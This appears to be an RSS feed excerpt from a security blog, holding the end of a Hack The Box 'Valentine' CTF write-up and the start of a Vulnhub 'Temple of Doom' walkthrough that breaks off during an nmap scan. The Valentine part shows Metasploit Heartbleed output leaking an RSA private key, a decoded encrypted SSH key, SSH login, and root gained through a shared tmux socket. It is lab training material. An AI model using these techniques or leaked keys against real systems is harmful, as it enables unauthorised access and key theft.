&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 10.10.10.79:443       - 2018-07-09 17:07:42 UTC - Attempt 0...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] 10.10.10.79:443       - 2018-07-09 17:07:47 UTC - Got the private key
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 10.10.10.79:443       - 
&lt;span class=&quot;nt&quot;&gt;-----BEGIN&lt;/span&gt; RSA PRIVATE KEY-----
MIIEpgIBAAKCAQEAwygXrPgZKkHSij/OeRwZ9PtI+tMvM2tvyJz5o78ZZqihjfki
Yg7hnkVQH1kvrLqVz68jqlTJZEAPJajF3cvEHIcM0nMSLnd2z4lI+zlK4fU9QMO1
moJo9o2Msk0/TwMJwLqtdF1TZLBXakQPH7f2+wWIrrLByt6m+8Vmd0YpdWDQr5Hd
WTA6C4+FIeVdyCIcVup6Lw0nXOKn1i5VRheHItUbZmIlhfoJHDhtGxSeqXrgMU1D
Js6wkebQm0jYz095+a8SRNRl5P93R1aFTTvprdtN6y0pl/hampnDrRcabHOkBB/l
1Y6ox6YgrorgULjxstJI3n2ziQ226G3Ho4JelwIDAQABAoIBAQCWkqd5wE6CSRjt
q/9deC4a04riY/CmJr2vtlXyXi52A6Pqi49YwwyW9fm0xjY/ehK+k+3brOFZ5QcK
0mYgE+iy7gwZj8k2atwTkmPp2bGKF5J0FsxWc0oS+PHWXD19c+Wheyb7gkomhNxd
VDerDGCWGxXzXF6jbRi/ZvYBDvRL59YOvXmdQa3MKykGywUn+NFZvUxICyEma24K
5ABMIWm5cTmDzm5Cd5/wn5Pu4tY0TIzfoa3KnA+M8vpmd4xgRGWGpatFKrM3LqSq
W0+Rr81Ty/R7lr1DkLDKp1ltvCl3pp1Lkoo3Ublk38C6gHHS3Vfs6h+QJfNgjeQu
RyKqm3H5AoGBAM8MF8KO2EtVQUrosnZQfn+2pLbY4n4Q66N3QaBeoqY7UipBJ1r3
jIfupiw5+M1gEXvBgnQmRLwRAA7Wmsh0/eCxeOk7kgNr7W8nNdxwp0Uv06h1CtEq
vFIuXab5pYG5/QKshabSXxY02QuaVgM/vXBTSOO0TC/7Rm6ORJzAxAeTAoGBAPFM
TE9WpalFjB0u+hHNbFRfRet8480wa5702AEDK/cHi0U+R9Z0Va/qm7PtzBP/m4nU
XJwZbvG9O2PKXusGmgIBc/jqSQpQriIvBb27AJiq65Jd7tJ4AiNZm6v/bFChFmWh
dZe1S4vBgnlYoRWHsu+3JJpMJFKZYYl9O/X8ZWdtAoGBAK1DJmL23MP13UTNhAKE
i8deVWp6BteOW1KZCr8kUqIfRDv99+wk+mIKcN7TyIQ9H4RbxEpkd+KVq2G/bxnO
5WFxwogTBLZ+S9xXiLgnQaMhSdNP1rSBOcTf7hk8EqeDt9nT+6hFpbLUmMkf51ii
r2nfGEEM8TC56w+7WGmA2sqnAoGBAOakinBvnwuMmaAvjgJEO57uLlQoXUp9VPFs
kaduE7EdOecm393B90GeW9QBoccf1NlK7naa7OwOd90ry8yU09LE9shfkQ9WDQxJ
rBAt1iUXgvK17Jiq80g818rw6+SqBVGBongvZ5WfkwpQSDDfM49knI0L6NA3If8c
gJrg9UCFAoGBAIetkT/XaN+IV3N/mkBVwLXPcDIP8aGp/qJaA6gd9ThPUh9dB8rI
bntGLbQ1rVg4Rl8NZaMi6vvgllqpecgrTOTDvhdyvWG21ayuyD3kYkPxB91bkUo2
+xJUUVx5lM5NNiefWNB+2RPBdsjSHa0VMYA3E1gjp/WQa9eelevdTBVk
&lt;span class=&quot;nt&quot;&gt;-----END&lt;/span&gt; RSA PRIVATE KEY-----

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 10.10.10.79:443       - Private key stored &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /root/.msf4/loot/20180709130747_default_10.10.10.79_openssl.heartble_729752.txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Scanned 1 of 1 hosts &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;100% &lt;span class=&quot;nb&quot;&gt;complete&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Auxiliary module execution completed&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, we have the private key! Will we be able to log in using it and the string encoded during the previous attack?&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/hackthebox/valentine# &lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;20180709130747_default_10.10.10.79_openssl.heartble_729752.txt rsa_key
root@kali:~/hackthebox/valentine# &lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;400 rsa_key

root@kali:~/hackthebox/valentine# ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; rsa_key hype@10.10.10.79
hype@10.10.10.79&lt;span class=&quot;s1&quot;&gt;'s password: 
Permission denied, please try again.
hype@10.10.10.79'&lt;/span&gt;s password: 
Permission denied, please try again.
hype@10.10.10.79&lt;span class=&quot;s1&quot;&gt;'s password: 
hype@10.10.10.79: Permission denied (publickey,password).&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Unfortunately not. After a few hours of more enumeration, I’ve noticed another directory in website, together with a &lt;code class=&quot;highlighter-rouge&quot;&gt;notes.txt&lt;/code&gt; file.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;http://10.10.10.79/dev/notes.txt

To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
6) Find a better way to take notes.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;In there we have another file.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;http://10.10.10.79/dev/hype_key

2d 2d 2d 2d 2d 42 45 47 49 4e 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 0d 0a 50 72 6f 63 2d 54 79 70 65 3a 20 34 2c 45 4e 43 52 59 50 54 45 44 0d 0a 44 45 4b 2d 49 6e 66 6f 3a 20 41 45 53 2d 31 32 38 2d 43 42 43 2c 41 45 42 38 38 43 31 34 30 46 36 39 42 46 32 30 37 34 37 38 38 44 45 32 34 41 45 34 38 44 34 36 0d 0a 0d 0a 44 62 50 72 4f 37 38 6b 65 67 4e 75 6b 31 44 41 71 6c 41 4e 35 6a 62 6a 58 76 30 50 50 73 6f 67 33 6a 64 62 4d 46 53 38 69 45 39 70 33 55 4f 4c 30 6c 46 30 78 66 37 50 7a 6d 72 6b 44 61 38 52 0d 0a 35 79 2f 62 34 36 2b 39 6e 45 70 43 4d 66 54 50 68 4e 75 4a 52 63 57 32 55 32 67 4a 63 4f 46 48 2b 39 52 4a 44 42 43 35 55 4a 4d 55 53 31 2f 67 6a 42 2f 37 2f 4d 79 30 30 4d 77 78 2b 61 49 36 0d 0a 30 45 49 30 53 62 4f 59 55 41 56 31 57 34 45 56 37 6d 39 36 51 73 5a 6a 72 77 4a 76 6e 6a 56 61 66 6d 36 56 73 4b 61 54 50 42 48 70 75 67 63 41 53 76 4d 71 7a 37 36 57 36 61 62 52 5a 65 58 69 0d 0a 45 62 77 36 36 68 6a 46 6d 41 75 34 41 7a 71 63 4d 2f 6b 69 67 4e 52 46 50 59 75 4e 69 58 72 58 73 31 77 2f 64 65 4c 43 71 43 4a 2b 45 61 31 54 38 7a 6c 61 73 36 66 63 6d 68 4d 38 41 2b 38 50 0d 0a 4f 58 42 4b 4e 65 36 6c 31 37 68 4b 61 54 36 77 46 6e 70 35 65 58 4f 61 55 49 48 76 48 6e 76 4f 36 53 63 48 56 57 52 72 5a 37 30 66 63 70 63 70 69 6d 4c 31 77 31 33 54 67 64 64 32 41 69 47 64 0d 0a 70 48 4c 4a 70 59 55 49 49 35 50 75 4f 36 78 2b 4c 53 38 6e 31 72 2f 47 57 4d 71 53 4f 45 69 6d 4e 52 44 31 6a 2f 35 39 2f 34 75 33 52 4f 72 54 43 4b 65 6f 39 44 73 54 52 71 73 32 6b 31 53 48 0d 0a 51 64 57 77 46 77 61 58 62 59 79 54 31 75 78 41 4d 53 6c 35 48 71 39 4f 44 35 48 4a 38 47 30 52 36 4a 49 35 52 76 43 4e 55 51 6a 77 78 30 46 49 54 6a 6a 4d 6a 6e 4c 49 70 78 6a 76 66 71 2b 45 0d 0a 70 30 67 44 30 55 63 79 6c 4b 6d 36 72 43 5a 71 61 63 77 6e 53 64 64 48 57 38 57 33 4c 78 4a 6d 43 78 64 78 57 35 6c 74 35 64 50 6a 41 6b 42 59 52 55 6e 6c 39 31 45 53 43 69 44 34 5a 2b 75 43 0d 0a 4f 6c 36 6a 4c 46 44 32 6b 61 4f 4c 66 75 79 65 65 30 66 59 43 62 37 47 54 71 4f 65 37 45 6d 4d 42 33 66 47 49 77 53 64 57 38 4f 43 38 4e 57 54 6b 77 70 6a 63 30 45 4c 62 6c 55 61 36 75 6c 4f 0d 0a 74 39 67 72 53 6f 73 52 54 43 73 5a 64 31 34 4f 50 74 73 34 62 4c 73 70 4b 78 4d 4d 4f 73 67 6e 4b 6c 6f 58 76 6e 6c 50 4f 53 77 53 70 57 79 39 57 70 36 79 38 58 58 38 2b 46 34 30 72 78 6c 35 0d 0a 58 71 68 44 55 42 68 79 6b 31 43 33 59 50 4f 69 44 75 50 4f 6e 4d 58 61 49 70 65 31 64 67 62 30 4e 64 44 31 4d 39 5a 51 53 4e 55 4c 77 31 44 48 43 47 50 50 34 4a 53 53 78 58 37 42 57 64 44 4b 0d 0a 61 41 6e 57 4a 76 46 67 6c 41 34 6f 46 42 42 56 41 38 75 41 50 4d 66 56 32 58 46 51 6e 6a 77 55 54 35 62 50 4c 43 36 35 74 46 73 74 6f 52 74 54 5a 31 75 53 72 75 61 69 32 37 6b 78 54 6e 4c 51 0d 0a 2b 77 51 38 37 6c 4d 61 64 64 73 31 47 51 4e 65 47 73 4b 53 66 38 52 2f 72 73 52 4b 65 65 4b 63 69 6c 44 65 50 43 6a 65 61 4c 71 74 71 78 6e 68 4e 6f 46 74 67 30 4d 78 74 36 72 32 67 62 31 45 0d 0a 41 6c 6f 51 36 6a 67 35 54 62 6a 35 4a 37 71 75 59 58 5a 50 79 6c 42 6c 6a 4e 70 39 47 56 70 69 6e 50 63 33 4b 70 48 74 74 76 67 62 70 74 66 69 57 45 45 73 5a 59 6e 35 79 5a 50 68 55 72 39 51 0d 0a 72 30 38 70 6b 4f 78 41 72 58 45 32 64 6a 37 65 58 2b 62 71 36 35 36 33 35 4f 4a 36 54 71 48 62 41 6c 54 51 31 52 73 39 50 75 6c 72 53 37 4b 34 53 4c 58 37 6e 59 38 39 2f 52 5a 35 6f 53 51 65 0d 0a 32 56 57 52 79 54 5a 31 46 66 6e 67 4a 53 73 76 39 2b 4d 66 76 7a 33 34 31 6c 62 7a 4f 49 57 6d 6b 37 57 66 45 63 57 63 48 63 31 36 6e 39 56 30 49 62 53 4e 41 4c 6e 6a 54 68 76 45 63 50 6b 79 0d 0a 65 31 42 73 66 53 62 73 66 39 46 67 75 55 5a 6b 67 48 41 6e 6e 66 52 4b 6b 47 56 47 31 4f 56 79 75 77 63 2f 4c 56 6a 6d 62 68 5a 7a 4b 77 4c 68 61 5a 52 4e 64 38 48 45 4d 38 36 66 4e 6f 6a 50 0d 0a 30 39 6e 56 6a 54 61 59 74 57 55 58 6b 30 53 69 31 57 30 32 77 62 75 31 4e 7a 4c 2b 31 54 67 39 49 70 4e 79 49 53 46 43 46 59 6a 53 71 69 79 47 2b 57 55 37 49 77 4b 33 59 55 35 6b 70 33 43 43 0d 0a 64 59 53 63 7a 36 33 51 32 70 51 61 66 78 66 53 62 75 76 34 43 4d 6e 4e 70 64 69 72 56 4b 45 6f 35 6e 52 52 66 4b 2f 69 61 4c 33 58 31 52 33 44 78 56 38 65 53 59 46 4b 46 4c 36 70 71 70 75 58 0d 0a 63 59 35 59 5a 4a 47 41 70 2b 4a 78 73 6e 49 51 39 43 46 79 78 49 74 39 32 66 72 58 7a 6e 73 6a 68 6c 59 61 38 73 76 62 56 4e 4e 66 6b 2f 39 66 79 58 36 6f 70 32 34 72 4c 32 44 79 45 53 70 59 0d 0a 70 6e 73 75 6b 42 43 46 42 6b 5a 48 57 4e 4e 79 65 4e 37 62 35 47 68 54 56 43 6f 64 48 68 7a 48 56 46 65 68 54 75 42 72 70 2b 56 75 50 71 61 71 44 76 4d 43 56 65 31 44 5a 43 62 34 4d 6a 41 6a 0d 0a 4d 73 6c 66 2b 39 78 4b 2b 54 58 45 4c 33 69 63 6d 49 4f 42 52 64 50 79 77 36 65 2f 4a 6c 51 6c 56 52 6c 6d 53 68 46 70 49 38 65 62 2f 38 56 73 54 79 4a 53 65 2b 62 38 35 33 7a 75 56 32 71 4c 0d 0a 73 75 4c 61 42 4d 78 59 4b 6d 33 2b 7a 45 44 49 44 76 65 4b 50 4e 61 61 57 5a 67 45 63 71 78 79 6c 43 43 2f 77 55 79 55 58 6c 4d 4a 35 30 4e 77 36 4a 4e 56 4d 4d 38 4c 65 43 69 69 33 4f 45 57 0d 0a 6c 30 6c 6e 39 4c 31 62 2f 4e 58 70 48 6a 47 61 38 57 48 48 54 6a 6f 49 69 6c 42 35 71 4e 55 79 79 77 53 65 54 42 46 32 61 77 52 6c 58 48 39 42 72 6b 5a 47 34 46 63 34 67 64 6d 57 2f 49 7a 54 0d 0a 52 55 67 5a 6b 62 4d 51 5a 4e 49 49 66 7a 6a 31 51 75 69 6c 52 56 42 6d 2f 46 37 36 59 2f 59 4d 72 6d 6e 4d 39 6b 2f 31 78 53 47 49 73 6b 77 43 55 51 2b 39 35 43 47 48 4a 45 38 4d 6b 68 44 33 0d 0a 2d 2d 2d 2d 2d 45 4e 44 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;After converting these values to ASCII system (hex -&amp;gt; ascii), we have another private key.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Let’s save it once again and try to connect to &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/hackthebox/valentine# &lt;span class=&quot;nb&quot;&gt;touch &lt;/span&gt;private_key
root@kali:~/hackthebox/valentine# vi private_key 
root@kali:~/hackthebox/valentine# &lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;400 private_key 
root@kali:~/hackthebox/valentine# ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; private_key hype@10.10.10.79
Enter passphrase &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;key &lt;span class=&quot;s1&quot;&gt;'private_key'&lt;/span&gt;: 
Welcome to Ubuntu 12.04 LTS &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU/Linux 3.2.0-23-generic x86_64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Documentation:  https://help.ubuntu.com/

New release &lt;span class=&quot;s1&quot;&gt;'14.04.5 LTS'&lt;/span&gt; available.
Run &lt;span class=&quot;s1&quot;&gt;'do-release-upgrade'&lt;/span&gt; to upgrade to it.

Last login: Mon Jul  9 10:46:16 2018 from 10.10.15.212
hype@Valentine:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;

hype@Valentine:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Desktop/
hype@Valentine:~/Desktop&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
&amp;lt;flag&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now let’s find a way to escalate to root.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;hype@Valentine:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /
hype@Valentine:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 108
drwxr-xr-x  26 root root  4096 Feb  6 11:56 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x  26 root root  4096 Feb  6 11:56 ..
drwxr-xr-x   2 root root  4096 Dec 11  2017 bin
drwxr-xr-x   3 root root  4096 Feb 16 14:41 boot
drwxr-xr-x   2 root root  4096 Dec 11  2017 cdrom
drwxr-xr-x  13 root root  4060 Jul  9 11:21 dev
drwxr-xr-x   2 root root  4096 Dec 13  2017 devs
drwxr-xr-x   2 root hype  4096 Jul  9 11:21 .devs
drwxr-xr-x 132 root root 12288 Jul  9 11:21 etc
drwxr-xr-x   3 root root  4096 Dec 11  2017 home
lrwxrwxrwx   1 root root    32 Dec 11  2017 initrd.img -&amp;gt; boot/initrd.img-3.2.0-23-generic
drwxr-xr-x  21 root root  4096 Dec 11  2017 lib
drwxr-xr-x   2 root root  4096 Apr 25  2012 lib64
drwx------   2 root root 16384 Dec 11  2017 lost+found
drwxr-xr-x   3 root root  4096 Apr 25  2012 media
drwxr-xr-x   3 root root  4096 Dec 11  2017 mnt
drwx------   2 root root  4096 Dec 13  2017 opt
dr-xr-xr-x 104 root root     0 Jul  9 11:21 proc
drwx------   4 root root  4096 Feb  6 12:00 root
drwxr-xr-x  20 root root   740 Jul  9 11:26 run
drwxr-xr-x   2 root root  4096 Feb 16 14:40 sbin
drwxr-xr-x   2 root root  4096 Mar  5  2012 selinux
drwxr-xr-x   2 root root  4096 Apr 25  2012 srv
drwxr-xr-x  13 root root     0 Jul  9 11:21 sys
drwxrwxrwt   5 root root  4096 Jul  9 11:30 tmp
drwxr-xr-x  10 root root  4096 Apr 25  2012 usr
drwxr-xr-x  14 root root  4096 Feb  6 12:01 var
lrwxrwxrwx   1 root root    29 Dec 11  2017 vmlinuz -&amp;gt; boot/vmlinuz-3.2.0-23-generic
hype@Valentine:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; .devs
hype@Valentine:/.devs&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 8
drwxr-xr-x  2 root hype 4096 Jul  9 11:21 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 26 root root 4096 Feb  6 11:56 ..
srw-rw----  1 root hype    0 Jul  9 11:21 dev_sess
hype@Valentine:/.devs&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file dev_sess 
dev_sess: socket&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We have a &lt;code class=&quot;highlighter-rouge&quot;&gt;dev_sess&lt;/code&gt; socket, with &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; owner, but &lt;code class=&quot;highlighter-rouge&quot;&gt;group&lt;/code&gt; is &lt;code class=&quot;highlighter-rouge&quot;&gt;hype&lt;/code&gt;. That means we can connect it, as we’re in the same group. Let’s try it with &lt;code class=&quot;highlighter-rouge&quot;&gt;tmux&lt;/code&gt; command (you can find it also while checking out bash history).&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;hype@Valentine:/.devs&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tmux &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; /.devs/dev_sess

total 8
drwxr-xr-x  2 root hype 4096 Jul  9 11:21 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 26 root root 4096 Feb  6 11:56 ..
srwxrwx---  1 root hype    0 Jul  9 11:21 dev_sess
root@Valentine:/.devs# &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root/
root@Valentine:~# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 52
drwx------  4 root root 4096 Feb  6 12:00 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 26 root root 4096 Feb  6 11:56 ..
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 root root  263 Feb 16 14:42 .bash_history
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root 3108 Dec 13  2017 .bashrc
drwx------  2 root root 4096 Feb  6 12:00 .cache
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root  140 Apr 19  2012 .profile
drwx------  2 root root 4096 Dec 13  2017 .pulse
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 root root  256 Dec 11  2017 .pulse-cookie
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 root root 1024 Feb  5 16:45 .rnd
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root   66 Dec 13  2017 .selected_editor
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root   73 Dec 13  2017 .tmux.conf
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;  1 root root  388 Dec 13  2017 curl.sh
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root   33 Dec 13  2017 root.txt
root@Valentine:~# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;root.txt
&amp;lt;flag&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

</description>
        <pubDate>Sat, 28 Jul 2018 02:00:00 +0200</pubDate>
        <link>http://localhost:4000/hackthebox-valentine/</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox-valentine/</guid>
      </item>
    
      <item>
        <title>Vulnhub.com - Temple Of Doom 1</title>
        <description>&lt;p&gt;Today we’re going to walk through  very cool machine from Vulnhub called &lt;strong&gt;&lt;em&gt;Temple of Doom&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;[+] A CTF created by https://twitter.com/0katz
[+] Difficulty: Easy/Intermediate
[+] Tested in VirtualBox
[+] Note: 2 ways to get root!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;ul&gt;
  &lt;li&gt;Author: &lt;a href=&quot;https://twitter.com/0katz&quot;&gt;0katz&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Download: &lt;a href=&quot;https://www.vulnhub.com/entry/temple-of-doom-1,243/&quot;&gt;https://www.vulnhub.com/entry/temple-of-doom-1,243/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Big thanks to the author for creating this challenge and for Vulnhub for hosting and curating this great set of machines!&lt;/p&gt;

&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;

&lt;p&gt;Firstly, as always we’re going to start with the &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;em&gt;-v&lt;/em&gt; - verbose output&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;-sS&lt;/em&gt; - TCP-SYN scan&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;-A&lt;/em&gt; - OS detection, version detection and traceroute&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;-T4&lt;/em&gt; - aggresive scan&lt;/li&gt;
&lt;/ul&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; 10.0.0.5
Starting Nmap 7.70 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2018-07-11 11:17 EDT
NSE: Loaded 148 scripts &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;scanning.
NSE: Script Pre-scanning.
Initiating NSE at 11:17
Completed NSE at 11:17, 0.00s elapsed
Initiating NSE at 11:17
Completed NSE at 11:17, 0.00s elapsed
Initiating ARP Ping Scan at 11:17
Scanning 10.0.0.5 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 port]
